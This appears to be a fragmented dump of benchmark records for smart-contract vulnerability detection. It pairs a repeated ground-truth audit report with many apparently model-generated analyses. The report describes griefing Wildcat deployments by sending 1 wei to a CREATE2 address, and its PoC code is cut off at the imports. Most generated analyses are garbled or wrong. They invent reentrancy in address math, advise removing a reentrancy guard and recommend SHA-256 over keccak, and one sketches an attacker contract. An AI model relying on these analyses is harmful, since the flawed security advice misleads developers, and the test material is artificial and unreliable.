`nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

The reason for this is that the code does not allow an attacker to manipulate another user's funds or assets directly. Instead, it creates a new escrow contract and assigns ownership of the escrow contract to the borrower account. The escrow contract then transfers the asset to the borrower account on behalf of the lender. This ensures that the lender cannot manipulate the asset directly and that only the borrower can access it.\n\nHowever, there is one possible vulnerability that could be exploited in the code. The `getEscrowAddress` function returns a new escrow contract address based on the input parameters (borrower account, account, and asset). This means that if an attacker knows the input parameters of another user's escrow contract, they may be able to guess the address of their own escrow contract. This could potentially lead to the disclosure of sensitive information or a denial of service attack.\n\nTo mitigate this vulnerability, it would be best to use a more secure hashing algorithm such as SHA-256 or BLAKE-256, and to ensure that the salt value is unique for each escrow contract.

However, it only checks if the sender is a registered market through the `isRegisteredMarket` method in the `WildcatArchController` contract, but does not verify the permissions of the user invoking the action.\n\nA malicious actor can exploit this vulnerability by providing a `borrower` address that they control and have permission to manipulate, while providing their own `account` and `asset` addresses that they do not control. This allows them to potentially perform unauthorized actions on behalf of the legitimate user without proper authorization checks.\n\nTo mitigate this vulnerability, developers should ensure that all sensitive actions and methods in the smart contract have appropriate authorization checks in place, ensuring that operations affecting user-controlled resources are genuinely owned by the resource owners or explicitly authorized by them. This can be achieved through the use of direct comparisons with unique identifiers or established trust and delegation systems.

The vulnerability is related to incorrect authorization validation during the creation of an escrow contract.\n\nThe reason for this vulnerability is that the authorization check in the createEscrow function is performed before computing the actual amount on which the authorization should be verified. Specifically, the function accepts a placeholder value (account) as input and internally converts it to a legitimate amount. However, the authorization check is based on the initial placeholder value (account), rather than the final computed amount. This means that an attacker can pass the placeholder value that will bypass the authorization check and subsequently lead to the function computing a meaningful amount for the action, thereby performing operations they are not really authorized to conduct.\n\nTo determine whether the given smart contract code is vulnerable, I need to review it step by step. Here's my analysis:\n\n1. The createEscrow function accepts three parameters - borrower, account, and asset. However, it only uses the first two parameters (borrower and account) for authorization checks.\n2. The function first checks if the market is registered using the IWildcatArchController contract. If not, it reverts with a NotRegisteredMarket error.\n3. It then gets the escrow address from the getEscrowAddress function. However, it does not use this address for authorization checks.\n4. The function creates a new WildcatSanctionsEscrow contract using the salt value computed from borrower, account, and asset parameters. This salt value is used to initialize the contract and set up the escrow conditions.\n5. It then emits two events - NewSanctionsEscrow and SanctionOverride. The first event notifies about the creation of a new escrow contract, while the second event notifies about the override of the sanctions restrictions for the borrower in the newly created escrow contract.\n6. Finally, it resets the tmpEscrowParams variable to null.\n\nBased on this analysis, I can determine that there is a potential vulnerability in the createEscrow function related to incorrect authorization validation.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced

The most likely type of vulnerability is a authorization bypass flaw, which allows unauthorized users to perform actions on behalf of another user without proper authorization.\n\nThe reason for this vulnerability is the function `createEscrow` in the contract. This function creates an escrow contract and sets its address as `escrowContract`. The function also checks if the market where the escrow contract will be used is registered, but it does not check if the caller of the function is authorized to create an escrow contract on behalf of another user (i.e., `borrower`).\n\nTherefore, a malicious actor can bypass authorization checks and create an escrow contract for any user they want, potentially allowing them to manipulate or steal assets of other users. This is a potential vulnerability as it allows an attacker to exploit the system's trust in the integrity of user-supplied parameters without adequate verification.",

If the check fails, the function reverts with an error message indicating that the caller is not a registered market. This means that only registered markets can call this function, and the authorization validation is performed correctly.\n\nAdditionally, the function also checks whether the escrow contract has already been deployed for the given borrower, account, and asset. If it has, the function returns the existing escrow contract address without creating a new one.

Specifically, the `createEscrow` function in the provided smart contract code allows users to create an escrow contract with a specific borrower, account, and asset, without proper authorization checks.\n\nThe reason for this vulnerability is that the `borrower`, `account`, and `asset` variables are passed as arguments to the `getEscrowAddress` function, which returns the address of the escrow contract created for the specified borrower and asset. However, these variables can be manipulated by users who have access to them, allowing them to create an escrow contract for a different borrower or asset than intended. This can lead to unauthorized actions, such as token transfers or modifications of critical state variables, or access to restricted functions within the smart contract system.\n\nTo mitigate this vulnerability in the provided smart contract code, contract developers should implement rigorous access control checks that authenticate and authorize user interactions with sensitive functions or objects, ensuring only entitled users can perform such actions. Additionally, validating all received object references in function calls against the caller's permissions is crucial to ensure that a user can only interact with objects they are authorized to access. Finally, using indirect reference maps or other secure design patterns where direct object references are not exposed to users can reduce the attack surface and prevent similar vulnerabilities.",

The reason for this is that the `nukeFromOrbit` function calls the `_getUpdatedState` function, which can modify the state of the contract, and then calls the `_blockAccount` function, which also modifies the state of the contract. This can lead to a reentrancy vulnerability if an attacker tries to call the `nukeFromOrbit` function from within one of these functions, causing multiple transactions to be executed in sequence.\n\nHere's how this vulnerability can occur:\n\n1. An attacker calls the `nukeFromOrbit` function with a specific account address as an argument.\n2. The `nukeFromOrbit` function checks if the borrower is sanctioned by calling the `isSanctioned` function on the `IWildcatSanctionsSentinel` contract. If the borrower is not sanctioned, the function reverts with a \"BadLaunchCode\" error.\n3. The `_getUpdatedState` function is called to update the state of the contract. This function can modify the state of the contract in various ways, including updating the balance of the borrower.\n4. The `_blockAccount` function is called to block the account specified as an argument from accessing the contract's functions. This function also modifies the state of the contract by adding the blocked account to a list of blocked accounts.\n5. If the attacker tries to call the `nukeFromOrbit` function again before the first transaction has completed, it will execute the `_getUpdatedState` and `_blockAccount` functions multiple times, causing multiple transactions to be executed in sequence. This can lead to a reentrancy vulnerability if the attacker is able to predict when the first transaction will complete and call the `nukeFromOrbit` function at that time.\n\nTo mitigate this vulnerability, it's recommended to add a reentrancy guard to the `nukeFromOrbit` function, which prevents multiple transactions from being executed in sequence. This can be done by adding a boolean variable `isNuking` and setting it to true when the first transaction is started and false when it completes. The function can then check the value of `is",

Therefore, if two or more users trust each other and have approved each other for withdrawals, an attacker can observe the end of a specific epoch and initiate withdrawals in the last block, causing losses for legitimate users without gaining anything in return.\n\nTo mitigate this vulnerability, the `nukeFromOrbit` function should be modified to check the caller's authorization instead of the receiver's authorization.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This function updates the state of the market by subtracting the normalized amount withdrawn from the total unclaimed withdrawals. However, it does not check whether the account that is making the withdrawal has been approved to do so.\n\nIn other words, if two or more users are able to approve each other for withdrawals and an attacker is able to observe the end of a specific epoch, they can initiate a mass withdrawal in the last block, causing losses for legitimate users without gaining anything in return. This can routinely disrupt the system and affect user trust in the platform.\n\nTo mitigate this vulnerability, the approval requirement should be changed to check for the caller's authorization, rather than the receiver's, ensuring only valid users can initiate withdrawals.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This can be done by exploiting the reentrancy issue in the smart contract code, where the same function is called recursively without properly checking if it has already been executed.\n\nTo mitigate this vulnerability, the `nonReentrant` modifier should be removed from the `executeWithdrawal` function, and instead, a separate `withdrawFunds` function should be created that checks for reentrancy before withdrawing funds.

If the expiry has passed, the function reverts with an error message indicating that the batch has already expired.\n\nHowever, if the expiry is still valid, the function proceeds with executing the withdrawal. It first retrieves the updated state of the market and then checks if the current account address is sanctioned by the wildcat sanctions sentinel. If it is, the function blocks the account and creates an escrow for the user to receive their funds. Otherwise, it transfers the normalized amount withdrawn directly to the user's account.\n\nThe issue here is that the hardcoded slippage threshold in the `MathUtils.mulDiv` function can prevent users from withdrawing their funds even if they are not sanctioned. The threshold is set by the `status.scaledAmount` and `batch.normalizedAmountPaid` variables, which are both hardcoded to 100.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

                "poc_patch": "  Based on the given vulnerability knowledge, the smart contract code is potentially vulnerable to a \"Reentrancy Attack\" vulnerability. This type of vulnerability occurs when a function call is made during the execution of another function call, leading to unintended behavior and potentially exploitable conditions.\n\nTo confirm whether this vulnerability exists in the given smart contract code, we need to analyze the `calculateCreate2Address` function. The function takes three parameters: `create2Prefix`, `salt`, and `initCodeHash`. It uses these inputs to generate a hash value that will be used as an address for a new token contract.\n\nThe vulnerability arises from the fact that the function calls the `keccak256` function with two input parameters: `0x0b` and `0x55`. These values are not validated, which means that any caller can supply these values to trigger the reentrancy attack.\n\nThe PoC for this vulnerability is relatively simple. A malicious contract could call the `calculateCreate2Address` function with the above-mentioned input parameters, and another contract could be deployed using the resulting address. This new contract would inherit all of the state variables from the original contract, including any tokens that were transferred to it. The attacker can then manipulate the new contract's state variables to gain control over the original contract's assets.\n\nTo patch this vulnerability, the `calculateCreate2Address` function should validate the input parameters passed to the `keccak256` function to ensure that they are valid and have not been tampered with. This can be done by checking the input values against a whitelist or by using a secure hash function such as `sha3`.\n\nIn conclusion, the given smart contract code is potentially vulnerable to a reentrancy attack due to the lack of validation for input parameters passed to the `keccak256` function. The PoC for this vulnerability is relatively simple and can be confirmed by analyzing the `calculateCreate2Address` function.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

The function `calculateCreate2Address` appears to be attempting to generate an address for the creation of a new Ethereum contract using the `CREATE2` opcode. The `create2Prefix` argument is passed in as a `uint256`, and the `salt` and `initCodeHash` arguments are passed in as `bytes32`.\n\nThe function appears to be generating a hash of the concatenation of these three arguments using the `keccak256` algorithm. The `0x0b` and `0x55` values are hardcoded into the assembly code, which appear to be related to the `CREATE2` opcode.\n\nThe vulnerability you mentioned is likely a reentrancy attack. The function appears to be using the `create2Prefix` argument as the prefix for the address being generated, but it does not use the `salt` or `initCodeHash` arguments in any way. This means that an attacker could potentially generate a new address with an arbitrary entry point by passing in their own value for `create2Prefix`.\n\nThe reason this is a vulnerability is because the `CREATE2` opcode allows an attacker to deploy a contract with a specific address, even if that address already exists on the Ethereum blockchain. By using the `calculateCreate2Address` function with a specially crafted `create2Prefix`, an attacker could potentially gain control over an existing contract or steal funds from it.\n\nTo mitigate this vulnerability, the `CREATE2` opcode should be used in conjunction with a secure random number generator (such as a hash of a cryptographically secure random seed) to ensure that the address being generated is truly unique and cannot be predicted by an attacker. Additionally, any sensitive operations such as transferring tokens or executing other state-changing functions should be implemented using a reentrancy guard pattern to prevent multiple calls to these functions from occurring in parallel.",

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

The `msg.sender` address is checked against the list of registered borrowers using the `isRegisteredBorrower()` function from the `archController` contract.

The `_tmpMarketBorrowerParameter` variable is set to the `msg.sender` address, and then used as a salt for creating a new controller contract using the `calculateCreate2Address()` function from the `LibStoredInitCode` library. This function takes the owner's address (i.e., the `_tmpMarketBorrowerParameter` variable) and the `controllerInitCodeHash` as input, and generates a unique address for the new controller contract based on the hashed parameters.\n3. The generated address is then checked against the `codehash` attribute of the new controller contract using the `LibStoredInitCode.create2WithStoredInitCode()` function from the `LibStoredInitCode` library.

The code snippet provided does not appear to be vulnerable to this type of attack.\n\nHere's why:\n\n1. In the given code, a check is made to ensure that the caller of the `deployController()` function is registered as a borrower using the `isRegisteredBorrower()` method from the `archController` contract. This check helps prevent unauthorized users from deploying malicious vaults with malicious staking contracts.\n2. The `deployController()` function calculates the address of the controller to be deployed using the `calculateCreate2Address()` method from the `LibStoredInitCode` library. This method takes several parameters, including a prefix, salt, and initialization code hash for the controller. The salt is set to the borrower's address, which prevents an attacker from deploying malicious vaults with the same address as a legitimate vault.\n3. Before deploying the controller, the function checks whether the controller already exists using the `codehash` property of the contract address. If the controller already exists, the function reverts the transaction. This check prevents an attacker from deploying multiple malicious vaults with the same address as a legitimate vault.\n4. The function then creates the controller using the `create2WithStoredInitCode()` method from the `LibStoredInitCode` library, which takes the initialization code hash and salt as parameters. This method deploys the controller contract using a deterministic address derived from the hash of the initialization code and the salt.\n5. Finally, the function registers the controller with the `archController` contract and adds it to the `_deployedControllers` set.\n\nOverall, the given smart contract code appears to be secure against the vulnerability described in the knowledge statement. However, it is always important to carefully review and analyze complex code to ensure that it meets the requirements of your use case and is not vulnerable to attack.",

The reason for this vulnerability is that the `LibStoredInitCode.create2WithStoredInitCode` function is called without checking if the `ownerCreate2Prefix` variable has been initialized correctly. This means that an attacker can call the `deployController` function multiple times with different addresses, causing the contract to deploy new contracts with different initialization codes, potentially leading to a denial of service (DoS) or other attacks.\n\nTo mitigate this vulnerability, the following changes can be made:\n\n1. Check if the `ownerCreate2Prefix` variable has been initialized correctly before calling `LibStoredInitCode.create2WithStoredInitCode`. This can be done by adding a check such as `require(ownerCreate2Prefix != address(0), \"ownerCreate2Prefix must not be 0\");`\n2. Use a different salt value for each deployment of the contract, to prevent an attacker from using the same salt multiple times and causing the contract to deploy new instances with the same initialization code.\n3. Implement a mechanism to limit the number of contracts that can be deployed by a single address, in order to prevent an attacker from using the vulnerability to launch a large-scale denial of service (DoS) attack.\n4.

This external call could potentially trigger a state change before the initial state change has completed, leading to inconsistencies in the smart contract's state.\n2.

To evaluate whether the given smart contract code is indeed vulnerable to a reentrancy attack, I would first need to analyze the `LibStoredInitCode` library's `create2WithStoredInitCode()` function to determine how it handles state changes during external calls. Additionally, I would need to review the `archController` and `registerController()` functions to understand their behavior with respect to state updates during external calls.\n4. If the smart contract code is indeed vulnerable to a reentrancy attack, then a potential PoC or patch could be generated by using an exploit script that triggers a flash loan reentrancy attack on the given contract. This would involve constructing a malicious contract that borrows resources and then, within the callback function it triggers, calls back into the lending function. The exploit script would need to ensure that the reentrancy attempt is successful by properly triggering the vulnerable state change before the initial state change has completed.\n5. After evaluating the potential PoC or patch, I would need to review the smart contract code again to determine whether the changes proposed in the PoC or patch actually address the vulnerability. If the changes do not fully mitigate the risk of reentrancy attacks, then the smart contract code should be modified further to ensure that it is secure against such attacks.",

        "gtraw": "\n# Vulnerability details\n\n## Bug Description\n\nIn `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.\n\nThe function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:\n\n\n\n```solidity\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) { // auditor: This check\n      revert ControllerAlreadyDeployed();\n    }\n```\n\nThis same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:\n\n\n\n```solidity\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\nThis check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:\n\n\n\n```solidity\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n```\n\nHowever, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code.\n\nAccording to , addresses without code only return a `0x0` codehash when they are **empty**:\n> In case the account does not exist or is empty (as defined by  `0` is pushed to the stack.\n>\n> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.\n\nAs seen from above, addresses without code can also return `keccak256(\"\")` as its codehash if it is non-empty.  states that an address must have a zero ETH balance for it to be empty:\n\n> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.\n\nAs such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256(\"\")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.\n\nSince all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:\n- For controller deployments:\n  - Attacker calls  to compute the controller address for a borrower.\n  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.\n  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.\n- For market deployments:\n  - Attacker calls  with arguments such that the deployment salt is the same. \n  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.\n  - When `deployMarket()` is called by the borrower, the function reverts.\n- For escrow deployments:\n  - Attacker calls  with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.\n  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.\n  - When either  or  is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.\n  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.\n\nNote that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

The `create2WithStoredInitCode` function takes a hash of the contract code as an argument, and uses it to create a new contract with that code. However, there is no check in place to ensure that the input hash is actually the correct hash of the contract code.\n\nThis means that an attacker can potentially pass a malicious contract code to the `calculateCreate2Address` function, which will then be used to deploy the malicious contract. This could lead to a variety of problems, including:\n\n* The contract being deployed with unexpected or malicious behavior.\n* The contract being deployed with access to sensitive information or tokens.\n* The contract being deployed with a backdoor that allows an attacker to steal funds or take control of the contract.\n\nTo mitigate this vulnerability, it is important to ensure that the input hash passed to the `calculateCreate2Address` function is actually the correct hash of the contract code.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

Lack of input validation: The `deployMarket` function does not validate the input parameters for the market creation process. This means that a malicious user could potentially create a new market with invalid or malformed data, which could cause unexpected behavior and potentially lead to security issues.\n2. Use of unsafe operations: The code uses several unsafe operations, such as `safeTransferFrom` without proper checks for success and failure cases, and `calculateCreate2Address` without ensuring that the returned address is correct. These operations can lead to unexpected behavior and potentially security vulnerabilities if not used properly.\n3. Incorrect use of state variables: The code uses several state variables, such as `marketInitCodeStorage`, `ownCreate2Prefix`, `_tmpMarketParameters`, and `_controlledMarkets`, without ensuring that they are correctly initialized and used. This could lead to unexpected behavior and potentially security vulnerabilities if not handled properly.\n\nIn conclusion, while the given smart contract code does not appear to have any immediate vulnerability issues, it is important to carefully review and test the code to ensure that all potential security concerns are addressed.

In this case, the vulnerability stems from the fact that the depositor address is not checked or restricted during the initialization process, allowing bad actors to manipulate the initialization to their advantage.\n\nTo mitigate this issue, a creator address should be passed and set to the sender address during the market creation process, which will prevent attackers from forcing vault deposits from unsuspecting users while ensuring deposits can only be made by authorized accounts. This would require a patch to the smart contract code to ensure that the correct creator address is passed and set during the initialization process.\n\nI do not have access to the entirety of the smart contract code, but based on the information provided, I believe that this vulnerability is present in the `deployMarket` function. The `if` statement in the first line of the function checks if the message sender (who is creating the market) is a borrower. If they are not a borrower and the caller is not the controller factory address, then it reverts with an error.\n\nHowever, there is no check to ensure that the depositor address passed in the initialization process is the same as the sender address, which could potentially allow for a front-running attack.

This can be done by changing the line `if (msg.sender == borrower)` to `if (msg.sender == address(controllerFactory))`.\n\nHere is a potential PoC that demonstrates how this vulnerability could be exploited:\n```solidity\npragma solidity ^0.8.13;\n\ncontract Attacker {\n    function attack() public {\n        // Create a market with the attacker as the initial depositor\n        factory.deployMarket(address(this), \"Test\", \"TTT\", 1, 2, 3, 4, 5, 6);\n\n        // Approve the vault contract for transferFrom function to succeed\n        token.approve(vaultAddress, 1000);\n\n        // Create a second market with the victim as the initial depositor\n        factory.deployMarket(victimAddress, \"Test\", \"TTT\", 1, 2, 3, 4, 5, 6);\n    }\n}\n```\nIn this PoC, the attacker creates a market with their own address as the initial depositor and approves the vault contract for transferFrom function to succeed. Then, they create another market with the victim's address as the initial depositor and manipulate the market creation process by using the victim's tokens as initial deposit without their consent.\n\nHere is a potential patch that could be used to mitigate this vulnerability:\n```solidity\npragma solidity ^0.8.13",

The `deployMarket` function allows anyone to call it, even if they are not registered as a borrower or the controller factory. This could lead to a vulnerability where an attacker can create a large number of markets and consume all available gas resources on the chain.\n2. The `_resetTmpMarketParameters` function is never called in this code, which suggests that there may be unintended side effects if multiple markets are created with different parameters.\n3.

However, it does not check whether the contract is already deployed or has been destroyed. This could lead to vulnerabilities if an attacker can create multiple markets with the same address.\n4.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

To mitigate this vulnerability, a creator address should be passed and set to the sender address during the market creation process, which will prevent attackers from forcing vault deposits from unsuspecting users while ensuring deposits can only be made by authorized accounts.\n\nTherefore, we can conclude that the function `deployMarket` is vulnerable to the initialization attack, and the provided smart contract code should be modified accordingly to mitigate this vulnerability.",

    {
